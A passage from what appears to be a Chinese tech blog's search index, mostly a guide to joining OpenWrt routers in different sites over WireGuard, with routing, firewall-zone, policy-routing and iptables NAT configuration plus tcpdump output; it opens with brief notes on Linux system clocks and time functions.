clock\uff0c\u7cfb\u7edf\u65f6\u95f4\uff0c\u6307\u5185\u6838\u8f6f\u4ef6\u7ef4\u62a4\u7684\u65f6\u95f4\uff0c\u7528\u4e8e\u5b9e\u73b0gettimeofday\uff0ctime\u7b49\u51fd\u6570\u3002\u901a\u5e38\u901a\u8fc7timer\u4e2d\u65ad\u5b9e\u73b0\uff0c\u4e2d\u65ad\u9891\u7387\u4e00\u822c\u4e3a100\uff0c1000\u6bcf\u79d2\u3002</li> <li>\u5728\u7535\u8111\u5f00\u673a\u65f6\uff0ckernel\u5c06System clock\u8bbe\u7f6e\u4e3aRTCs\u65f6\u95f4\u3002\u5bf9\u4e8e\u6ca1\u6709RTCs\u7684\u8bbe\u5907\uff0c\u5219\u9700\u8981\u901a\u8fc7\u7f51\u7edc\u540c\u6b65\u65f6\u95f4</li> <li>clock(3)</li> <li> <p>In glibc 2.17 and earlier, clock() was implemented on top of     &gt;        times(2).  For improved accuracy, since glibc 2.18, it is     &gt;        implemented on top of clock_gettime(2) (using the     &gt;        CLOCK_PROCESS_CPUTIME_ID clock).</p> </li> <li>calendar time</li> <li>time_t</li> <li>time since Epoch ( 1970-01-01 00:00:00 +0000 (UTC))</li> <li>ex     <pre><code> clock_gettime(2) CLOCK_REALTIME\n time(2)\n</code></pre></li> <li>broken-down time</li> <li>struct tm</li> <li>ctime(3) Kernel Timer Systems - eLinux.org</li> </ul>","tags":["clock","rtc","time"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/","title":"Wireguard\u7ec4\u7f51","text":"<p>wireguard\u662f\u4e00\u79cd\u57fa\u4e8eUDP\u7684\u96a7\u9053\u534f\u8bae\uff0c\u53ef\u4ee5\u5728\u4e0d\u540c\u8bbe\u5907\u95f4\u5efa\u7acb\u865a\u62df\u96a7\u9053\uff0c\u4ece\u800c\u8fde\u63a5\u4e0d\u540c\u5b50\u7f51\u3002\u672c\u6587\u603b\u7ed3\u4e86\u4e0d\u540c\u4f7f\u7528\u573a\u666f</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u5f02\u5730\u7ec4\u7f51","title":"\u5f02\u5730\u7ec4\u7f51","text":"<p>\u5f02\u5730\u7ec4\u7f51\u5c31\u662f\u901a\u8fc7\u96a7\u9053\u6280\u672f\uff0c\u5c06\u4e24\u4e2a\u72ec\u7acb\u7684\u7f51\u7edc\u6253\u901a\uff0c\u8ba9\u5176\u4e2d\u7684\u8bbe\u5907\u80fd\u591f\u901a\u8fc7\u5185\u7f51\u5730\u5740\u76f4\u63a5\u76f8\u4e92\u8bbf\u95ee\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wg\u4e09\u5c42\u96a7\u9053","title":"wg\u4e09\u5c42\u96a7\u9053","text":"<p>\u7531\u4e8e\u5de5\u4f5c\u5728\u4e09\u5c42\uff0c\u6240\u4ee5\u5173\u952e\u5728\u4e8e\u8def\u7531\u8868\u7684\u8bbe\u7f6e\u3002</p> <p>\u963f\u91cc\u4e91\u6709VPC\u7684\u6982\u5ff5\uff0cVPC\u4e4b\u95f4\u662f\u9694\u79bb\u7684\u3002\u963f\u91cc\u4e91\u63d0\u4f9b\u4e86\u4e00\u4e9b\u65b9\u5f0f\u8ba9\u5176\u76f8\u4e92\u8fde\u63a5\u3002\u8fd9\u548c\u6211\u4eec\u7684\u9700\u6c42\u662f\u975e\u5e38\u7c7b\u4f3c\u7684\u3002 \u4e91\u4f01\u4e1a\u7f51\u548cVPN\u7f51\u5173\u8fde\u63a5\u4e0d\u540cVPC\u7684\u4f18\u52bf\u548c\u65b9\u6cd5_\u4e13\u6709\u7f51\u7edc VPC-\u963f\u91cc\u4e91\u5e2e\u52a9\u4e2d\u5fc3 (aliyun.com)</p> <p>\u8fd9\u91cc\u5217\u51fa\u4e24\u79cd\u901a\u7528\u7f51\u7edc\u7ed3\u6784 - \u70b9\u5bf9\u70b9\u8fde\u63a5\u3002\u591a\u4e2aVPC\u95f4\u4e24\u4e24\u8fde\u63a5\uff0c\u4fdd\u8bc1\u5ef6\u8fdf\u6700\u4f4e - \u661f\u578b\u7ed3\u6784\uff0c\u6bcf\u4e2a\u8282\u70b9\u53ea\u9700\u8981\u914d\u7f6e\u548c\u4e2d\u5fc3\u8282\u70b9\u7684\u8fde\u63a5 </p> <p></p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wggretap\u4e8c\u5c42\u96a7\u9053","title":"wg+gretap\u4e8c\u5c42\u96a7\u9053","text":"<p>TODO</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#openwrt\u5f02\u5730\u7ec4\u7f51\u5b9e\u4f8b","title":"openwrt\u5f02\u5730\u7ec4\u7f51\u5b9e\u4f8b","text":"","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u6211\u7684\u7f51\u7edc\u7ed3\u6784\u4f8b\u5b50","title":"\u6211\u7684\u7f51\u7edc\u7ed3\u6784\u4f8b\u5b50","text":"<p>\u4e09\u4e2a\u8def\u7531\u5668\u901a\u8fc7wg\u4e24\u4e24\u8fde\u63a5\uff08\u5176\u5b9e\u4e0d\u4e00\u5b9a\u9700\u8981\u8fd9\u4e2a\u7ed3\u6784\uff0c\u4e5f\u53ef\u4ee5\u914d\u7f6e\u6210op2-op1-op3\u8fd9\u79cd\u94fe\u72b6\u7ed3\u6784\uff0c\u8fd9\u79cd\u7ed3\u6784\u4e3b\u8981\u964d\u4f4e\u4e86\u4e00\u6b21\u8f6c\u53d1\uff0c\u5ef6\u8fdf\u4e00\u822c\u66f4\u77ed\uff09</p> <p></p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wg-site-to-site\u914d\u7f6e","title":"wg site to site\u914d\u7f6e","text":"","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u63a5\u53e3","title":"\u63a5\u53e3","text":"<p>\u5728\u8def\u7531\u5668\u4e0a\u65b0\u5efawg_s2s\u63a5\u53e3 - \u534f\u8bae\u9009\u62e9Wireguard VPN - \u5206\u914d\u79c1\u6709\u5730\u5740 - \u914d\u7f6e\u597d\u76d1\u542c\u7aef\u53e3\uff08\u4e4b\u540e\u5728\u9632\u706b\u5899\u4e2d\u8bbe\u7f6eallow input\uff09</p> <p>\u4e24\u8fb9\u5747\u521b\u5efa\u597d\u540e\u518d\u76f8\u4e92\u6dfb\u52a0peer</p> <p>op1  </p> <p>op2  </p> <p>op1\u4e0aop2 peer\u8bbe\u7f6e\u4f8b\u5b50 - allowed ip\u586b\u5199op2 wg_s2s\u63a5\u53e3\u8bbe\u7f6e\u7684\u79c1\u6709\u5730\u5740\uff0c\u5e76\u586b\u5199op2\u6240\u5728\u7684\u5b50\u7f51\u7f51\u6bb5 - route allow ip\u9700\u8981\u52fe\u9009\uff0c\u4f5c\u7528\u662f\u8ba9openwrt\u6839\u636eallowed ip\u751f\u6210\u8def\u7531 </p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u9632\u706b\u5899","title":"\u9632\u706b\u5899","text":"<p>\u4e24\u8fb9\u9700\u8981\u6dfb\u52a0\u4ee5\u4e0b\u9632\u706b\u5899\u89c4\u5219\uff0c\u4fdd\u8bc1wg\u80fd\u4ecewan\u6b63\u5e38\u8fde\u63a5\u3002\u534f\u8bae\u52fe\u9009UDP\u5373\u53ef </p> <p>\u7136\u540e\u662f\u5173\u4e8ezone\u7684\u8bbe\u7f6e\u3002</p> <p>wg_s2s\u63a5\u53e3\u53ef\u4ee5\u914d\u7f6e\u6210lan zone\uff0c\u5728\u63a5\u53e3\u4e2d\u52fe\u9009lan\u5373\u53ef\uff0c\u5982\u4e0b\u56fe\u6240\u793a\u3002  \u8fd9\u6837\u540e\u9762\u7684zone\u4e4b\u95f4\u8f6c\u53d1\u89c4\u5219\u5c31\u4e0d\u9700\u8981\u4fee\u6539\u3002\u4ee5\u4e0b\u6bb5\u843d\u53ef\u4ee5\u8df3\u8fc7\u3002</p> <p>\u4ee5\u4e0b\u8bbe\u7f6e\u9002\u5408\u5bf9\u9632\u706b\u5899\u539f\u7406\u611f\u5174\u8da3\u7684\u7528\u6237\uff1a</p> <p>\u4e3awg_s2s\u5355\u72ec\u8bbe\u7f6e\u4e00\u4e2a\u9632\u706b\u5899zone\uff0c\u53ef\u4ee5\u4f7f\u4ee5\u540e\u7684\u914d\u7f6e\u66f4\u7075\u6d3b\u3002</p> <p>op1\u548cop2 lan,wan, wg_s2s zone\u7684\u8bbe\u7f6e\u5982\u4e0b\u56fe\uff1a - <code>lan -&gt; wan, wg_s2s</code>\uff1a\u8868\u793a\u4e00\u4e2a\u5c40\u57df\u7f51\u7684\u6d41\u91cf\u53ef\u4ee5\uff081\uff09\u8bbf\u95ee\u4e92\u8054\u7f51(wan) \uff082\uff09\u901a\u8fc7wg_s2s\u63a5\u53e3\u8bbf\u95ee\u5bf9\u9762\u5b50\u7f51(wg_s2s) - <code>wg_s2s -&gt; lan</code>\uff1a\u8868\u793a\u5141\u8bb8\u4ecewg_s2s\u8fdb\u5165\u7684\u6d41\u91cf\uff08\u5bf9\u9762\u5b50\u7f51\u901a\u8fc7wg_s2s\uff09\u53ef\u4ee5\u8bbf\u95ee\u672c\u5b50\u7f51   - \u8fd9\u91cc\u8fd8\u5141\u8bb8\u4e86wg_s2s -&gt; wan\u662f\u4e3a\u4e86\u53e6\u4e00\u4e2a\u5b50\u7f51\u901a\u8fc7\u672c\u5b50\u7f51\u8bbf\u95ee\u4e92\u8054\u7f51\u7684\u60c5\u51b5 - wg_s2s\u7684masquerading\u53ef\u4ee5\u52fe\u9009\u4e5f\u53ef\u4ee5\u4e0d\u52fe\u9009   - \u52fe\u9009\uff1a\u8868\u793a\u4ecewg_s2s\u51fa\u53bb\u7684\u6d41\u91cf\u4f1a\u7ecf\u8fc7SNAT\uff0c\u5373\u5c06\u6e90\u5730\u5740\uff08\u53ef\u80fd\u662flan\u8bbe\u5907\u7684\u5730\u5740\uff09\u6362\u4e3awg_s2s\u7684\u5730\u5740\u3002\u8fd9\u6837\u4ece\u4e00\u4e2a\u5b50\u7f51\u8bbf\u95ee\u53e6\u4e00\u4e2a\u5b50\u7f51\u65f6\uff0c\u53e6\u4e00\u4e2a\u5b50\u7f51\u53ea\u80fd\u770b\u5230\u7ecf\u8fc7NAT\u540e\u7684\u5730\u5740\uff0c\u800c\u4e0d\u77e5\u9053\u53d1\u8d77\u8bbe\u5907\u7684lan\u5730\u5740\u3002   - \u4e0d\u52fe\u9009\uff1a\u597d\u5904\u5c31\u662f\u4e24\u4e2a\u5b50\u7f51\u76f8\u4e92\u8bbf\u95ee\u65f6\u80fd\u4fdd\u7559ip\u4fe1\u606f\u3002\u7f3a\u70b9\u662f\u7531\u4e8e\u53ea\u4e3awg_s2s\u8bbe\u7f6e\u4e86\u4e24\u8fb9lan\u7f51\u6bb5\u7684\u8def\u7531\uff08\u4e0a\u4e00\u8282\u7684allowed ip\uff09\uff0c\u4e00\u4e2a\u8def\u7531\u5668\u4e0a\u7684\u5176\u5b83\u63a5\u53e3\uff08\u5982wg1\uff09\u65e0\u6cd5\u901a\u8fc7wg_s2s\u8bbf\u95ee\u53e6\u5916\u4e00\u4e2a\u5b50\u7f51\u3002     - \u6ca1\u6709\u592a\u591a\u63a5\u53e3\u7684\u7b80\u5355\u7f51\u7edc\u60c5\u51b5\u4e0b\uff0c\u5efa\u8bae\u662f\u4e0d\u52fe\u9009 </p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u8def\u7531","title":"\u8def\u7531","text":"<p>\u4e0a\u9762op2\u5728\u6dfb\u52a0op1 peer\u65f6\uff0callowed ip\u8bbe\u7f6e\u4e860.0.0.0/0\uff0c\u8868\u793a\u6240\u6709\u6d41\u91cf\u90fd\u8d70wg_s2s\u51fa\u53bb\u3002\u5373op2\u901a\u8fc7op1\u4e0a\u7f51\u3002 </p> <p>wg_s2s peer\u8bbe\u7f6e\u597dallowed ip\u7684\u60c5\u51b5\u4e0b\uff0copenwrt\u5df2\u7ecf\u6b63\u786e\u751f\u6210\u4e86\u8def\u7531\u89c4\u5219\uff0c\u5982\u4e0b\u6240\u793a <pre><code>root@op1 \u279c  ~ ip ro\n10.0.32.2 dev wg_s2s proto static scope link\n192.168.36.0/24 dev wg_s2s proto static scope link\n</code></pre></p> <pre><code>root@op2 \u279c  ~ ip ro\ndefault dev wg_s2s proto static scope link\n10.0.32.1 dev wg_s2s proto static scope link\n192.168.35.0/24 dev wg_s2s proto static scope link\n</code></pre> <p>\u4ee5\u4e0a\u5f02\u5730\u7ec4\u7f51\u5df2\u7ecf\u5b8c\u6210\u4e86\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4e00\u4e2a\u4ece\u5b50\u7f51\u8bbf\u95ee\u53e6\u4e00\u4e2a\u5b50\u7f51\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u9898","title":"\u95ee\u9898","text":"","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u98981\u539f\u8def\u8fd4\u56de","title":"\u95ee\u98981\uff1a\u539f\u8def\u8fd4\u56de","text":"<p>\u5982\u679c\u4e00\u4e2a\u5b50\u7f51\u901a\u8fc7\u53e6\u4e00\u4e2a\u5b50\u7f51\u4e0a\u7f51\uff08\u4e0a\u9762\u914d\u7f6e\u4e2dop2\u901a\u8fc7op1\u4e0a\u7f51\uff09\uff0c\u5219\u4f1a\u9047\u5230\u4ee5\u4e0b\u95ee\u9898\uff1a \u4ece\u5916\u9762\u8bbf\u95eeop2 wan\u53e3\u7684ipv4\u5730\u5740\u65f6\uff0c\u8fd4\u56de\u7684\u5305\u5374\u4ecewg_s2s\u51fa\u53bb\u4e86\uff08\u9ed8\u8ba4\u8def\u7531\uff09\uff0c\u8fd9\u5bfc\u81f4\u65e0\u6cd5\u901a\u8fc7wan\u8bbf\u95eeop2\u4e86\u3002</p> <p>\u89e3\u51b3\u529e\u6cd5\uff1a\u6dfb\u52a0\u4e00\u6761\u6e90\u5730\u5740\u7684\u7b56\u7565\u8def\u7531\uff0c\u8868\u793a\u53ea\u8981src\u5730\u5740\u662fwan\u53e3\u5730\u5740\uff0c\u5747\u4ecewan\u53e3\u51fa\u53bb\u3002 <pre><code>echo \"10 wan\" &gt;&gt; /etc/iproute2/rt_tables\n\nip ru add from &lt;wan_ip&gt; lookup wan prior 3\nip ro add default via &lt;gateway&gt; dev &lt;wan_dev&gt; proto static table wan\n</code></pre></p> <p>\u7ed3\u679c <pre><code>root@op2 \u279c  ~ ip ru\n0:      from all lookup local\n3:      from xxx lookup wan\n32766:  from all lookup main\n32767:  from all lookup default\n\nroot@op2 \u279c  ~ ip ro show table wan\ndefault via yyy dev eth0 proto static\n</code></pre></p> <p>p.s: \u4e0d\u8fc7\u8be5\u539f\u8def\u8fd4\u56de\u4e5f\u4f1a\u5bfc\u81f4\u65e0\u6cd5\u4ecelan\u8bbf\u95eewan\uff08\u4e0d\u8fc7\u5e94\u8be5\u4e5f\u6ca1\u4eba\u4f1a\u8fd9\u4e48\u7528\u5427\uff09 \u4ecelan\u8bbf\u95eewan\u65f6\uff0c\u4f1a\u7531\u4e8e\u7b56\u7565\u8def\u7531\uff08src\u5730\u5740\u4e3awan\u5730\u5740\u65f6\u5168\u90e8\u4ecewan\u51fa\u53bb\uff09\u5c06\u54cd\u5e94\u4ecewan\u53d1\u51fa\u53bb\uff0c\u4ece\u800c\u65e0\u6cd5\u8bbf\u95ee <pre><code>root@op1 \u279c  opkg tcpdump -ni any tcp and port 8000\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n19:07:00.982145 eth1  In  IP 192.168.35.2.50214 &gt; 114.214.236.72.8000: Flags [S], seq 1381384154, win 64240, options [mss 1460,sackOK,TS val 2655701923 ecr 0,nop,wscale 7], length 0\n19:07:00.982145 br-lan In  IP 192.168.35.2.50214 &gt; 114.214.236.72.8000: Flags [S], seq 1381384154, win 64240, options [mss 1460,sackOK,TS val 2655701923 ecr 0,nop,wscale 7], length 0\n19:07:00.982180 br-wan Out IP 114.214.236.72.8000 &gt; 192.168.35.2.50214: Flags [S.], seq 256274565, ack 1381384155, win 65160, options [mss 1460,sackOK,TS val 2164672905 ecr 2655701923,nop,wscale 7], length 0\n19:07:00.982181 eth0  Out IP 114.214.236.72.8000 &gt; 192.168.35.2.50214: Flags [S.], seq 256274565, ack 1381384155, win 65160, options [mss 1460,sackOK,TS val 2164672905 ecr 2655701923,nop,wscale 7], length 0\n</code></pre></p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u98982\u5176\u5b83\u63a5\u53e3\u8de8\u7f51\u7edc\u8bbf\u95ee","title":"\u95ee\u98982\uff1a\u5176\u5b83\u63a5\u53e3\u8de8\u7f51\u7edc\u8bbf\u95ee","text":"<p>\u4e4b\u524d\u63d0\u5230\uff0c\u5982\u679cwg_s2s\u4e0d\u8bbe\u7f6emasquerading\uff0c\u90a3\u4e48\u4e00\u4e2a\u8def\u7531\u5668\u4e0b\u9664\u4e86lan\u5916\u7684\u5176\u5b83\u63a5\u53e3\uff0c\u5747\u65e0\u6cd5\u8bbf\u95ee\u5bf9\u9762\u8def\u7531\u5668\u7684\u5b50\u7f51\u3002</p> <p>\u6bd4\u5982\u901a\u5e38\u9700\u8981\u4e00\u4e2awg0\u7528\u4e8e\u4ece\u5916\u9762\u8fde\u63a5\u5230\u5185\u7f51\u3002\u800c\u8be5\u63a5\u53e3\u7684\u79c1\u6709\u5730\u5740\u548cwg_s2s\u662f\u4e0d\u4e00\u6837\u7684\u3002</p> <p>\u5728\u5f00\u542f\u4e86masquerading\u65f6\uff0c\u4e0d\u4f1a\u51fa\u95ee\u9898\u3002\u6bd4\u5982\u624b\u673a\u901a\u8fc7wg0\u8fde\u56deop1\uff0c\u518d\u8bbf\u95eeop2\u7684lan\u3002\u7f51\u7edc\u5305\u7684\u8f6c\u53d1\u8fc7\u7a0b\u5982\u4e0b</p> <p></p> <p>\u89e3\u51b3\u8be5\u95ee\u9898\u7684\u65b9\u6cd5\u548c\u4e0a\u56fe\u662f\u4e00\u6837\u7684\uff0c\u5c31\u662f\u901a\u8fc7iptable\uff0c\u53ea\u9488\u5bf9wg1\u6d41\u91cf\u901a\u8fc7wg_s2s\u65f6\u8fdb\u884cSNAT <pre><code>iptables -t nat -A POSTROUTING -s 172.16.0.0/24 -o wg_s2s -j MASQUERADE\n</code></pre> \u8be5\u547d\u4ee4\u91cd\u542f\u540e\u5931\u6548\uff0c\u53ef\u4ee5\u628a\u5b83\u5199\u5165<code>/etc/rc.local</code>\uff0c\u5728openwrt\u91cd\u542f\u540e\u81ea\u52a8\u8fd0\u884c\u3002</p> <p>\u66f4\u65b9\u4fbf\u7684\u662f\u76f4\u63a5\u4f7f\u7528openwrt\u63d0\u4f9b\u7684NAT\u8bbe\u7f6e\uff0c\u8bbe\u7f6e\u4f1a\u4fdd\u5b58\u5728<code>/etc/config/firewall</code>\u7684<code>nat</code> section\u4e2d\u3002 </p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#wg\u5176\u5b83\u76f8\u5173\u95ee\u9898","title":"wg\u5176\u5b83\u76f8\u5173\u95ee\u9898","text":"<ul> <li>wg allowip\u53ef\u4ee5\u770b\u4f5c\u9632\u706b\u5899input\u89c4\u5219\u3002</li> <li> <p>wg allowip\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u53c8\u4f1a\u4f5c\u4e3a\u8def\u7531\u89c4\u5219\uff0c\u8868\u793a\u54ea\u4e9b\u5730\u5740\u9700\u8981\u901a\u8fc7wg\u63a5\u53e3\u8def\u7531\u51fa\u53bb</p> <ul> <li>openwrt\u652f\u6301\u4e00\u4e2a\u9009\u9879\uff0c\u662f\u5426\u5f00\u542f\u901a\u8fc7allow ip\u81ea\u52a8\u6dfb\u52a0\u8def\u7531\u8868</li> </ul> </li> <li> <p>wg\u7684allow ip\u540c\u65f6\u8bbe\u7f6e\u4e86\u9632\u706b\u5899</p> <ul> <li>\u5bf9\u4e8e\u53d1\u5305\u6765\u8bf4\uff0callow ip\u662f\u8def\u7531\u3002\u5bf9\u4e8e\u6536\u5305\u6765\u8bf4\uff0callow ip\u662f\u9632\u706b\u5899\u3002\u800c\u6709\u65f6\u5019\u6211\u4eec\u5e0c\u671b\u8fd9\u4e24\u4e2a\u529f\u80fd\u662f\u5206\u5f00\u7684\u3002 wg0 allowed ip\u5982\u679c\u8bbe\u7f6e\u4e3a10.0.31.102/32\uff0c\u5219\u8868\u793a\u5176\u5b83src addr\u7684\u5305\u90fd\u4f1a\u88ab\u4e22\u5f03\u3002\u60f3\u8981\u5300\u901f\u4efb\u610f\u5305\uff0c\u9700\u8981\u8bbe\u7f6e\u4e3a0.0.0.0/0\u3002\u5982\u4e0b\u663e\u793a\u4e86\u4e00\u4e2awg0\u63a5\u53e3\u63a5\u53d7\u5176\u5b83\u6d41\u91cf\u7684\u6548\u679c\u3002 <pre><code>root@op1 \u279c  ~ tcpdump -ni any icmp and host 222.195.90.107\ntcpdump: data link type LINUX_SLL2\ntcpdump: verbose output suppressed, use -v[v]... for full protocol decode\nlistening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes\n15:52:11.410653 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 26710, seq 561, length 64\n15:52:12.410918 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 26710, seq 562, length 64\n15:52:13.411181 wg0   In  IP 222.195.90.107 &gt; 114.214.173.252: ICMP echo reply, id 26710, seq 563, length 64\n</code></pre></li> </ul> </li> </ul>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u65e0\u6cd5\u52a8\u6001\u8bbe\u7f6e\u8def\u7531","title":"\u65e0\u6cd5\u52a8\u6001\u8bbe\u7f6e\u8def\u7531","text":"<p>\u63a8\u8350\u7684\u529f\u80fd\uff0cpeer\u5efa\u7acb\u4e86\u8fde\u63a5\u65f6\uff0c\u624d\u8bbe\u7f6e\u8def\u7531\uff0c\u800c\u4e0d\u662f\u76ee\u524d\u7684\u63d0\u524d\u8bbe\u7f6e\u597d\u8def\u7531\u3002\u8fd9\u6837\u80fd\u7b80\u5316\u4ee5\u4e0b\u95ee\u9898\u7684\u89e3\u51b3\u3002</p>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u98981","title":"\u95ee\u98981","text":"<p>\u95ee\u9898\uff1a\u4e24\u4e2aop\u4e0a\u5747\u6709wg0\uff0c\u7528\u4e8e\u624b\u673a\u7b49\u8bbe\u5907\u4ece\u5916\u7f51\u8fde\u56de\u3002\u4e3a\u4e86\u7b80\u5316\u914d\u7f6e\u6587\u4ef6\uff0c\u5206\u914d\u4e86\u76f8\u540c\u5730\u5740\u6bb5\uff0c\u56e0\u6b64\u4e24\u4e2aop\u7684peer\u914d\u7f6e\u53ef\u4ee5\u590d\u7528\u3002\u7136\u800c\u8fd9\u5bfc\u81f4client\u901a\u8fc7wg0\u8fde\u5165op1\u65f6\uff0c\u65e0\u6cd5\u8bbf\u95eeop2\u7684\u7f51\u7edc\u3002\u56e0\u4e3aop2\u4e0a\u6536\u5230\u5305\u8fd4\u56de\u65f6\uff0c\u4f1a\u4ece\u672c\u5730\u7684wg0\u51fa\u53bb\u3002</p> <p>\u5982\u679cwg\u652f\u6301\u52a8\u6001\u8def\u7531\uff0c\u90a3\u4e48\u76ee\u7684\u5730\u5740\u662fwg0 client\u7684\u5305\u5c31\u4e0d\u4f1a\u4ece\u672c\u5730wg0\u53d1\u51fa\u3002\u800c\u662f\u8d70\u9ed8\u8ba4\u8def\u7531\uff0c\u901a\u8fc7op1-op2\u95f4\u7684\u96a7\u9053\u53d1\u7ed9op1\u3002</p> <p>\u901a\u8fc7SNAT\u89e3\u51b3</p> <p>\u9488\u5bf9\u8fd9\u4e2a\u95ee\u9898\u7684\u4e00\u79cd\u53ef\u63a5\u53d7\u7684\u89e3\u51b3\u529e\u6cd5\u662f\uff1a\u9488\u5bf9\u6e90\u5730\u5740\u662fwg0\u7684\u5305\uff0c\u5bf9wg_s2s\u51fa\u53bb\u7684\u6d41\u91cf\u8fdb\u884cSNAT - \u7f3a\u70b9\u662f\uff0c\u8fd9\u6837\u4e00\u4e2alan\u8bbf\u95ee\u53e6\u4e00\u4e2alan\u65f6\uff0c\u662f\u770b\u4e0d\u5230\u7ec6\u8282\u7684\uff0c\u53ea\u80fd\u770b\u5230\u4e00\u4e2a\u8def\u7531\u5668\u8bbf\u95ee\u53e6\u4e00\u4e2alan\u3002\u4e0d\u8fc7\u7531\u4e8ewg0\u53ea\u662f\u5728\u5916\u4e34\u65f6\u4f7f\u7528\uff0c\u56e0\u6b64\u4e5f\u80fd\u63a5\u53d7\u3002</p> <pre><code>iptables -t nat -A POSTROUTING -s 10.0.31.0/24 -o wg_s2s -j MASQUERADE\niptables -t nat -A POSTROUTING -s 10.0.33.0/24 -o wg_s2s -j MASQUERADE\n</code></pre>","tags":["wireguard","iptables","ip-rule","openwrt"]},{"location":"%E6%8A%98%E8%85%BE/2022/10/31/2022-10-31-Wireguard%E7%BB%84%E7%BD%91/#\u95ee\u98982","title":"\u95ee\u98982","text":"<p>\u95ee\u98982\uff1a\u60f3\u8981\u628awg\u5730\u5740\u4f5c\u4e3a\u67d0\u4e2a\u8bbe\u5907\u7ed1\u5b9a\u7684\u5730\u5740\u3002\u53ea\u8981\u8bbe\u5907\u901a\u8fc7wg\u63a5\u5165\u5185\u7f51\uff0c\u90a3\u4e48\u5728\u81ea\u5df1\u7684\u7f51\u7edc\u4e2d\u4efb\u4f55\u5730\u65b9\u90fd\u80fd\u591f\u8bbf\u95ee\u8be5\u8bbe\u5907\u3002\u7136\u800c\u73b0\u5b9e\u662f\uff0c\u53ea\u6709\u8bbe\u5907\u8fde\u63a5\u7684\u90a3\u4e2a\u5b50\u7f51\u53ef\u4ee5\u8bbf\u95ee\u3002 \u56e0\u4e3a\u5728\u4e24\u4e2aop\u4e0a\u53ea\u8981\u8bbe\u7f6e\u4e86peer\uff0c\u90a3\u4e48\u65e0\u8bba\u662f\u5426\u548cpeer\u8fde\u63a5\uff0c\u90fd\u4f1a\u8bbe\u7f6e\u5230peer\u7684\u8def\u7531\u3002\u8fd9\u4f7f\u5f97op\u4e0a\u8bbf\u95eewg0\u65f6\uff0c\u4f1a\u4ece\u81ea\u5df1\u7684wg0\u53d1\u51fa\u3002</p> <p>\u53d1\u73b0\u9020\u6210\u8fd9\u4e2a\u7684\u539f\u56e0\u5728\u4e8e\uff0cwg\u65e0\u6cd5\u5728\u8fde\u63a5\u65f6\u52a8\u6001\u5730\u6dfb\u52a0\u8def\u7531\u8868\u3002\u5982\u679c\u662fpeer\u8fde\u63a5op1\u65f6\uff0cop1\u751f\u6210\u4e00\u6761\u8def\u7531\u8868\u3002\u800cop2\u4e0a\u7531\u4e8e\u6ca1\u6709\u8fde\u63a5\uff0c\u4fbf\u6ca1\u6709\u5173\u4e8epeer wg0\u5730\u5740\u7684\u8def\u7531\u8868\u3002\u56e0\u6b64op2\u4e0a\u8bbf\u95eepeer\u65f6\u5c31\u4f1a\u901a\u8fc7\u9ed8\u8ba4\u7f51\u5173\uff0c\u800c\u53ea\u9700\u8981\u5728wg_s2s\u4e0a\u6dfb\u52a0\u4e00\u4e2awg0/24\u7684\u8def\u7531\u8868\u4fbf\u53ef\u4ee5\u4e00\u52b3\u6c38\u9038\u4e86\u3002</p> <p>\u59a5\u534f\u7684\u65b9\u6cd5 wg0 client\u540c\u65f6\u548c\u8fde\u63a5\u4e24\u4e2aop - 